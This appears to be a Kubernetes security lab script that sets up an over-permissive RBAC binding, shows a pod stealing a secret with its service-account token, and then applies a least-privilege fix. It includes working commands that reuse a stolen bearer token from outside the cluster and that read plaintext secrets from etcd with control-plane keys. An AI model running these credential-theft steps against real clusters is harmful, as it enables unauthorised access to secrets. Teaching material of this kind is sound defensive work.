#!/usr/bin/env bash
# Session 05 — reproducible attack + fix (reference; run steps manually)

# --- Build the audit-enabled cluster (from this dir, both yaml files present) ---
# kind create cluster --name sec-lab --config kind-audit.yaml
# docker exec sec-lab-control-plane tail -1 /var/log/kubernetes/audit.log   # confirm CCTV

# --- Plant the misconfig (THE ATTACK SETUP) ---
kubectl create secret generic db-creds \
  --from-literal=username=admin --from-literal=password=SuperSecret123

kubectl create serviceaccount app-sa
kubectl create clusterrole secret-reader --verb=get,list --resource=secrets
kubectl create clusterrolebinding app-sa-binding \
  --clusterrole=secret-reader --serviceaccount=default:app-sa

kubectl run attacker-pod --image=nicolaka/netshoot \
  --overrides='{"spec":{"serviceAccountName":"app-sa"}}' \
  --command -- sleep 3600

# --- The theft (from inside the pod, using its mounted token) ---
# kubectl exec -it attacker-pod -- bash -c '
#   TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
#   curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
#     -H "Authorization: Bearer $TOKEN" \
#     https://kubernetes.default.svc/api/v1/namespaces/default/secrets/db-creds | jq .data
# '

# --- Inspect / audit RBAC ---
# kubectl auth can-i --list --as=system:serviceaccount:default:app-sa   # see the grid
# kubectl auth can-i list secrets --as=system:serviceaccount:default:app-sa   # yes (over-grant)

# --- THE FIX (least privilege) ---
# kubectl apply -f least-priv-role.yaml
# kubectl create rolebinding db-creds-binding --role=db-creds-reader --serviceaccount=default:app-sa
# kubectl delete clusterrolebinding app-sa-binding     # <-- REQUIRED (RBAC is additive)
# kubectl delete clusterrole secret-reader
# kubectl auth can-i list secrets --as=system:serviceaccount:default:app-sa   # now: no

# --- Bypass demos ---
# token is a bearer credential — read the secret from the LAPTOP with a stolen token:
# TOKEN=$(kubectl exec attacker-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)
# APISERVER=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')
# curl -sk -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/default/secrets/db-creds | jq .data
#
# etcd/node bypass — RBAC does not apply below the API server (plaintext secret):
# kubectl -n kube-system exec etcd-sec-lab-control-plane -- sh -c \
#   "ETCDCTL_API=3 etcdctl \
#    --cacert /etc/kubernetes/pki/etcd/ca.crt \
#    --cert /etc/kubernetes/pki/etcd/server.crt \
#    --key /etc/kubernetes/pki/etcd/server.key \
#    get /registry/secrets/default/db-creds" | strings
